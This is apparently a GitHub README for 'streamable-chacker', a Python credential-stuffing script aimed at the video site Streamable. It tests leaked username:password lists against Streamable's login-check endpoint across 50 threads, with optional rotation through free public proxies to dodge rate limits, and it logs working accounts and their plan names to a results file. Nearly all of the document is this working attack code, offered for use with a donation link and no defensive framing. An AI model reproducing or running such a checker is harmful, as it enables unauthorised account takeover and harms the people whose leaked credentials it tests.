# streamable-chacker

## Description

This Python script performs a series of checks using a list of username-password combinations. It utilizes proxies obtained from a public proxy API to make requests to a specified URL.

## Code

```python
import datetime
import random
from concurrent.futures import ThreadPoolExecutor
import requests

x = datetime.datetime.now()

def get_proxies():
    url = 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&country=all&anonymity=all&timeout=9200&proxy_format=ipport&format=text'
    r = requests.get(url).text.split()
    return r

proxy_list = get_proxies()

def get_random_proxy():
    return {
        "http": f"http://{random.choice(proxy_list)}",
        "https": f"https://{random.choice(proxy_list)}"
    }

def proxy_request(type, url, **kwargs):
    session = requests.session()
    while 1:
        try:
            proxy = get_random_proxy()
            r = session.request(type, url, proxies=proxy, timeout=5, **kwargs).json()
            # return r
            break
        except:
            # print('proxy error')
            pass
    return r

def checker(combo):
    username = combo.split(":")[0]
    password = combo.split(":")[1]

    url = "https://ajax.streamable.com/check"
    post_data = {
        "username": username,
        "password": password
    }
    r = requests.post(url, json=post_data).json()
    # r = proxy_request('post', url, json=post_data)

    # print(username, password)
    if "ad_tags" in r:
        print(f"[GOOD HIT] {username} : {password} Plan = {r['plan_name']}")
        write_to_file(username, password, r['plan_name'])
    else:
        print(f"[BAD HIT] {username} : {password} ")

with open("combo.txt", "r") as file:
    combos = file.read().split()

def write_to_file(username, password, account_type):
    open(f'Results\\[Good Hits] {x.strftime(" %d-%m-%y %I-%M-%S-%P ")}.txt', 'a').write(
        f"{username}:{password} Plan={account_type}"
    )

def main():
    with ThreadPoolExecutor(max_workers=50) as executor:
        # futures =[executor.submit(checker,combo) for combo in combos]
        # executor.shutdown(wait=True)
        try:
            futures = [executor.submit(checker, combo) for combo in combos]
            executor.shutdown(wait=True)
        except Exception as e:
            print(f'Error in ThreadPoolExecutor: {e}')
            pass

if __name__ == '__main__':
    main()
# print(combos)
# checker('email@email.com:password')
# print(get_random_proxy())
```
# Donate Me
<a href="https://www.buymeacoffee.com/trojanhax" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>

